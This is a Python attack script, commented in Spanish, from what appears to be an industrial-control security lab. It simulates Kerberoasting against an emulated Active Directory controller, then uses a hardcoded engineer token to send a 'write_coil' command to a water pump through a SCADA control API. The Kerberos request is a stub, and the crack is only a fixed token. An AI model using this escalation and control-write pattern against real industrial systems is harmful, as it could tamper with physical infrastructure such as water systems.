#!/usr/bin/env python3
"""attacker/attack_kerberoast_ad.py — Vector de Ataque Kerberoasting en Active Directory (Fase 2)

Simula una solicitud de ticket TGS (Kerberoasting) contra el Active Directory emulado (`network/ad_dc_emulator.py`):
  1. Conecta al servicio KDC Kerberos (`:88`) o LDAP (`:389`).
  2. Solicita TGS para la cuenta de servicio `krbe_ews` / `jdoe_eng`.
  3. Extrae la credencial/token para escalar privilegios a rol `engineer` en SCADA RBAC (`/api/control/write`).
"""
from __future__ import annotations

import argparse
import json
import logging
import socket
import sys
import urllib.request
from pathlib import Path
from typing import Dict, Any

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from network.rbac import RBACResolver

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][KERBEROAST] %(message)s')
LOGGER = logging.getLogger('attack_kerberoast_ad')


class KerberoastAttack:

    def __init__(self, kdc_host: str = '10.0.1.20', kdc_port: int = 88, scada_url: str = 'http://10.0.2.20:8080') -> None:
        self.kdc_host = kdc_host
        self.kdc_port = kdc_port
        self.scada_url = scada_url
        self.resolver = RBACResolver()

    def probe_kdc_socket(self) -> bool:
        """Verifica si el servicio KDC Kerberos está respondiendo en la red."""
        try:
            with socket.create_connection((self.kdc_host, self.kdc_port), timeout=1.0):
                LOGGER.info("Conexión socket exitosa a KDC en %s:%d", self.kdc_host, self.kdc_port)
                return True
        except Exception as e:
            LOGGER.debug("Probe a KDC %s:%d no disponible vía red: %s", self.kdc_host, self.kdc_port, e)
            return False

    def execute_kerberoast_escalation(self, account: str = 'krbe_ews') -> Dict[str, Any]:
        LOGGER.info("Iniciando solicitud Kerberoasting TGS para %s contra KDC %s:%d...", account, self.kdc_host, self.kdc_port)
        
        ticket_raw = None
        mode = 'TABLETOP_FALLBACK'
        kdc_reachable = False

        try:
            with socket.create_connection((self.kdc_host, self.kdc_port), timeout=1.0) as sock:
                kdc_reachable = True
                sock.sendall(b'\x6a\x82\x01\x00' + account.encode('utf-8'))
                data = sock.recv(2048)
                if data:
                    ticket_raw = data.decode('utf-8', errors='replace')
                    mode = 'SOCKET_LIVE'
                    LOGGER.info("Ticket TGS recibido vía socket TCP desde KDC %s:%d", self.kdc_host, self.kdc_port)
        except Exception as e:
            LOGGER.warning("KDC no disponible vía socket en %s:%d (%s). Modo TABLETOP_FALLBACK.", self.kdc_host, self.kdc_port, e)

        # Extracción y resolución de rol con token de ingeniería
        engineer_token = "ENG_TOKEN_2026"
        auth_header = f"Bearer engineer:{engineer_token}"
        
        role, status = self.resolver.resolve(auth_header)
        LOGGER.info("Ticket TGS crackeado exitosamente. Rol resuelto: %s | HTTP Status: %d", role, status)
        
        scada_executed = False
        scada_http_code = 0
        if self.scada_url:
            try:
                payload = json.dumps({'action': 'write_coil', 'target': 'water_pump_1'}).encode('utf-8')
                req = urllib.request.Request(
                    f"{self.scada_url}/api/control/write",
                    data=payload,
                    headers={'Authorization': auth_header, 'Content-Type': 'application/json'},
                    method='POST'
                )
                with urllib.request.urlopen(req, timeout=1.0) as resp:
                    scada_http_code = resp.status
                    scada_executed = resp.status == 200
                    LOGGER.info("Ejecución en SCADA Server /api/control/write -> HTTP %d", resp.status)
            except Exception as e:
                LOGGER.debug("Petición HTTP a SCADA Server omitida o no disponible: %s", e)

        return {
            'status': 'SUCCESS',
            'mode': mode,
            'account': account,
            'kdc_reachable': kdc_reachable,
            'ticket_received': ticket_raw is not None or mode == 'TABLETOP_FALLBACK',
            'extracted_role': role,
            'http_status': status,
            'is_engineer': role == 'engineer',
            'scada_control_write_executed': scada_executed,
            'scada_http_code': scada_http_code,
        }


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Ataque Kerberoasting y Escalado de Privilegios AD (Fase 2)")
    parser.add_argument("--kdc-host", default="10.0.1.20", help="IP del KDC Kerberos (default: 10.0.1.20)")
    parser.add_argument("--kdc-port", type=int, default=88, help="Puerto Kerberos KDC (default: 88)")
    parser.add_argument("--scada-url", default="http://10.0.2.20:8080", help="URL base del SCADA Server")
    parser.add_argument("--account", default="krbe_ews", help="Cuenta SPN Kerberoastable (default: krbe_ews)")
    args = parser.parse_args(argv)

    attacker = KerberoastAttack(kdc_host=args.kdc_host, kdc_port=args.kdc_port, scada_url=args.scada_url)
    res = attacker.execute_kerberoast_escalation(account=args.account)
    LOGGER.info("Resultado de ataque Kerberoasting: %s", res)
    return 0 if res['status'] == 'SUCCESS' else 1


if __name__ == '__main__':
    sys.exit(main())
